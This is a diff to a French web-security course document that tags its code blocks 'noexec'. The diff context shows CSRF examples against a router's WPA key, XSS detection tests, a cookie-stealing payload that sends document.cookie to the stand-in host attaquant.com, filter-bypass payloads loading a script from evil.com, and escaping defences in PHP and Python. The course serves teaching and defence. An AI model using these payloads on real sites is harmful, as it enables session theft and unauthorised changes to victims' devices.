@@ -26,14 +26,14 @@ Le site cible execute la requete en pensant qu'elle vient de la victime.
 
 ### Exemple GET
 
-```html
+```html noexec
 <!-- Page malicieuse : change la cle WPA du routeur -->
 <img src="http://192.168.0.1/WPA.php?key=00DEAD">
 ```
 
 ### Exemple POST
 
-```html
+```html noexec
 <!-- Formulaire cache qui se soumet automatiquement -->
 <form action="https://target.com/change/key" method="POST">
     <input type="hidden" name="key" value="00DEAD" />
@@ -76,7 +76,7 @@ XSS           --> injecte dans la SORTIE WEB (HTML/JS)
 
 ### Tests de detection
 
-```html
+```html noexec
 <!-- Phase 1 : le HTML est-il interprete ? -->
 <b>aaa</b>
 <p style="color:red">test</p>
@@ -89,13 +89,13 @@ XSS           --> injecte dans la SORTIE WEB (HTML/JS)
 
 ### Exploitation : vol de cookie
 
-```html
+```html noexec
 <img src="0" onerror="window.location='http://attaquant.com/get.php?cookie='+document.cookie;">
 ```
 
 ### Techniques de contournement
 
-```html
+```html noexec
 <SCRipt>alert(42)</SCRipt>              <!-- casse mixte -->
 <img src=1>                             <!-- sans guillemets -->
 <SCRIPT SRC=http://evil.com/evil.js></SCRIPT>  <!-- script distant -->
@@ -122,13 +122,13 @@ XSS           --> injecte dans la SORTIE WEB (HTML/JS)
 
 ### Fonctions du langage
 
-```php
+```php noexec
 // PHP : htmlspecialchars avec ENT_QUOTES
 $pseudo = htmlspecialchars($_POST['name'], ENT_QUOTES);
 echo "Hello " . $pseudo . " !";
 ```
 
-```python
+```python noexec
 # Python : table d'echappement
 html_escape_table = {
     "&": "&amp;", '"': "&quot;", "'": "&apos;",
